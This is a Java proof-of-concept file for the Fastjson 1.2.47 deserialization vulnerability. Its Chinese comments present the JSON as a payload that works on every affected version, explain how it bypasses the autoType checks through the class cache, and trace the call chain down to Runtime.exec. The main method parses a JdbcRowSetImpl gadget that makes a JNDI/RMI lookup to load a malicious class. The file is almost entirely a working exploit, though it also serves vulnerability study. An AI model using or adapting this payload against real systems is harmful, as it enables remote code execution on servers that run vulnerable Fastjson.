package Fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/12 21:16
 */
public class Fastjson1247 {
    public static void main(String[] args) {
        /*
        mybatis在Fastjson 1.2.46之后也被ban了

        Fastjson <= 1.2.47的通杀payload如下：
        {
            {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://localhost/obj",
                "autoCommit": true
            }
        }

        注：Fastjson 1.2.25-1.2.32 需要AutoTypeSupport关闭，Fastjson 1.2.33-1.2.47任意都可以

        代码审计详情请见：https://zhuanlan.zhihu.com/p/140519505
        大致的思路就是：
        1. 我们的payload分为两部分，第一部分是为了在mapping中缓存com.sun.rowset.JdbcRowSetImpl类，第二部分是利用缓存的类进行jndi注入
        2. 利用的是读取MiscCodec类的cache缓存，随后进行反射invoke方法

        调用链：
        Exec:620,Runtime //命令执行
            ->Lookup:417,InitalContext //jndi lookup函数通过rmi加载恶意类
                ->setAutoCommit:4067,JdbcRowSetImpl //通过setAutoCommit触发lookup函数
                    ->setValue:96,FieldDeserializer //反射调用传入类的set函数
                        ->deserialze:600, JavaBeanDeserializer //通过循环调用传入类 set,get,is函数
                            ->parseObject:368,DefaultJSONParser //解析传入的json字符串
         */
        String payload ="{{\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost/obj\",\"autoCommit\": true}}";
        JSON.parse(payload);
    }
}
